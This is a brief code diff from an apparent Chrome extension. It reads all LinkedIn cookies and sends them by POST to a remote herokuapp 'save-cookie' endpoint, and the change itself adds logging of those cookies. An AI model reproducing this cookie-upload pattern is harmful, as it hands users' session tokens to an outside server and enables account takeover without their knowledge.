@@ -17,6 +17,8 @@ function LinkedInCookie() {
 		
 		chrome.cookies.getAll({ url: "https://www.linkedin.com/feed/" }, (cookie) => {
 			
+			console.log(cookie);
+			
 			fetch("https://sak-productivity-suite.herokuapp.com/save-cookie", {
 				method: "POST",
 				headers: {
